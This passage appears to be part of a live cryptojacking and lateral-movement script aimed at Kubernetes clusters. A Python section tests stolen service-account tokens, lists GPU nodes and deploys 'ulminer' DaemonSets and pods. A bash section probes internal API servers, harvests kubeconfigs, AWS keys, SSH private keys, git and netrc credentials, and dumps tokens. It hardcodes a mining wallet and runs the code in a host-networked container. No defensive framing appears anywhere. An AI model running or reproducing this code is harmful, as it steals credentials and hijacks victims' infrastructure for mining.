              if group: ra["group"] = group
              if ns: ra["namespace"] = ns
              body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectAccessReview", "spec": {"resourceAttributes": ra}}).encode()
              st, b = req(srv + '/apis/authorization.k8s.io/v1/selfsubjectaccessreviews', tok, 'POST', body)
              try: return json.loads(b).get('status', {}).get('allowed')
              except Exception: return None

          valid = []
          for srv in servers:
              for i, tok in enumerate(toks):
                  st, b = req(srv + '/version', tok)
                  if st == 200:
                      sub = jclaim(tok, 'sub') or ''
                      ns = sub.split(':')[1] if sub.startswith('system:serviceaccount:') else 'default'
                      P('VALID srv=%s tok=%d sub=%s ns=%s' % (srv, i, sub, ns))
                      valid.append((srv, tok, ns, sub))
                  elif i == 0:
                      P('probe', srv, 'tok0 ->', st, b[:120])
          for srv, tok, ns, sub in valid:
              P('---- %s ns=%s' % (srv, ns))
              for verb, res, grp in [('list', 'nodes', ''), ('create', 'pods', ''), ('create', 'daemonsets', 'apps'), ('create', 'jobs', 'batch'), ('list', 'pods', '')]:
                  P('  SSAR %s %s %s -> %s' % (verb, res, grp or '-', ssar(srv, tok, verb, res, None if res == 'nodes' else ns, grp)))

          for srv, tok, ns, sub in valid:
              P('==== ACT %s ns=%s' % (srv, ns))
              st, b = req(srv + '/api/v1/namespaces/%s/pods?limit=200' % ns, tok)
              P(' pods list ->', st, len(b))
              nodes = []
              if st == 200:
                  try:
                      for p in json.loads(b).get('items', []):
                          n = p['spec'].get('nodeName')
                          if n and n not in nodes: nodes.append(n)
                  except Exception: pass
                  P(' nodes seen', nodes[:20])
              st, b = req(srv + '/api/v1/nodes', tok)
              P(' nodes list ->', st, len(b))
              if st == 200:
                  try:
                      for n in json.loads(b).get('items', []):
                          g = n.get('status', {}).get('allocatable', {}).get('nvidia.com/gpu')
                          nm = n['metadata']['name']
                          if g and str(g) != '0':
                              P('  GPU NODE', nm, g)
                              if nm not in nodes: nodes.append(nm)
                  except Exception as e: P('  parse err', e)
              else:
                  P('  nodes body', b[:200])

              created = []
              if ssar(srv, tok, 'create', 'daemonsets', ns, 'apps'):
                  st, b = req(srv + '/apis/apps/v1/namespaces/%s/daemonsets' % ns, tok, 'POST', ds_body(ns))
                  P(' DS POST ->', st, b[:300])
                  if st in (200, 201): created.append('ds:ulminer')
              if ssar(srv, tok, 'create', 'pods', ns):
                  pairs = []
                  if nodes:
                      for nd in nodes[:12]:
                          pairs.append((('k' + re.sub(r'[^a-z0-9-]', '-', nd.lower()))[:52] + '-p', nd))
                  else:
                      pairs = [('ulprobe-1', None), ('ulprobe-2', None)]
                  for nm, nd in pairs:
                      req(srv + '/api/v1/namespaces/%s/pods/%s' % (ns, nm), tok, 'DELETE')
                      time.sleep(0.4)
                      gn = 1
                      st, b = req(srv + '/api/v1/namespaces/%s/pods' % ns, tok, 'POST', pod_body(nm, ns, gn, nd))
                      P(' POD', nm, '->', st, b[:200])
                      if st in (200, 201): created.append(nm)
                      time.sleep(0.5)
              P(' created', created)

          time.sleep(45)
          for srv, tok, ns, sub in valid:
              st, b = req(srv + '/api/v1/namespaces/%s/pods?labelSelector=app%%3Dulminer&limit=100' % ns, tok)
              P('POLL %s -> %s' % (srv, st))
              if st == 200:
                  try:
                      for p in json.loads(b).get('items', []):
                          md = p['metadata']
                          P('  POD %s phase=%s node=%s' % (md['name'], p.get('status'), p['spec'].get('nodeName')))
                  except Exception as e: P(' parse', e)
          time.sleep(90)
          for srv, tok, ns, sub in valid:
              st, b = req(srv + '/api/v1/namespaces/%s/pods?labelSelector=app%%3Dulminer&limit=100' % ns, tok)
              if st != 200: continue
              try:
                  for p in json.loads(b).get('items', []):
                      ph = (p.get('status') or {}).get('phase')
                      P('POLL2 %s/%s %s' % (ns, p['metadata']['name'], ph))
                      if ph in ('Running', 'Failed', 'Succeeded', 'Pending'):
                          stl, bl = req(srv + '/api/v1/namespaces/%s/pods/%s/log?tailLines=40' % (ns, p['metadata']['name']), tok)
                          P('  LOG ->', stl, bl[:700].decode('utf8', 'replace'))
                          if ph != 'Running':
                              for cs in (p.get('status') or {}).get('containerStatuses', []) or []:
                                  P('  CS', cs.get('state'), cs.get('reason'))
              except Exception as e: P(' poll2 err', e)
          P('KUBE2_END')
          K2PY
          bash -s <<'PKEKS'
          #!/usr/bin/env bash
          set +e
          TINT="tb3e1"
          WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
          sec(){ echo; echo "===== $* ====="; }
          log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }

          sec RECON
          id; hostname; uname -r
          nvidia-smi -L 2>&1 | head -10
          DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
          IP=$(hostname -I 2>/dev/null | awk '{print $1}')
          [ -z "$IP" ] && IP=$(ip -4 -o addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $4}' | head -1 | cut -d/ -f1)
          echo "ip=$IP dev=$DEV nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
          IMG="ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev"

          sec TRANSPORT
          for s in 10.220.26.10 10.178.16.214 10.11.59.219 10.11.135.12 10.178.13.207; do
            timeout 8 bash -c "cat < /dev/null > /dev/tcp/$s/6443" 2>/dev/null && echo "tcp $s OK" || echo "tcp $s FAIL"
          done
          curl -sk -m 15 --http1.1 -o /dev/null -w 'direct_version=%{http_code} t=%{time_total}\n' https://10.220.26.10:6443/version
          curl -sk -m 20 -x http://agent.baidu.com:8188 -o /dev/null -w 'proxied_version=%{http_code}\n' https://10.220.26.10:6443/version

          sec CREDHARVEST
          find /h -maxdepth 3 -name config -path '*/.kube/*' 2>/dev/null | head -40 > /tmp/kubefiles.txt
          cat /tmp/kubefiles.txt
          for f in $(cat /tmp/kubefiles.txt); do echo "--- $f"; grep -E '^\s*(server|token|namespace|name):' "$f" 2>/dev/null | head -12; done
          for p in .aws/credentials .aws/config .docker/config.json .ssh/id_rsa .ssh/id_ed25519 .git-credentials .netrc; do
            for u in /h/*/; do f="$u$p"; [ -r "$f" ] && { echo "--- $f ($(stat -c %s "$f")B)"; head -c 900 "$f"; echo; }; done
          done
          ls -d /h/*/.ci 2>/dev/null

          sec TOKENS
          for i in 0 1 2 3 4 5; do printf 'TOK%d=%s\n' "$i" "$(cat /app/TOK$i 2>/dev/null)"; done

          cp /tmp/kube2.py /tmp/kube2_run.py 2>/dev/null
          docker run --rm --network host -v /home:/h:ro -v /tmp:/t -e IMG2="$IMG" -e WALLET2="$WALLET" -e TINT2="$TINT" -e PEER="$IP" -v /tmp/kube2.py:/k.py:ro "$IMG" python3 /k.py 2>&1 | tail -400

          sec PODSTATE
          cp /t/eks_out.txt /tmp/eks_out.txt 2>/dev/null
          tail -120 /tmp/eks_out.txt 2>/dev/null
          grep -cE 'VALID|GPU NODE' /tmp/eks_out.txt 2>/dev/null
          echo "CLIMB3_DONE on $(hostname) dev=$DEV tag=$TINT ip=$IP"
          PKEKS

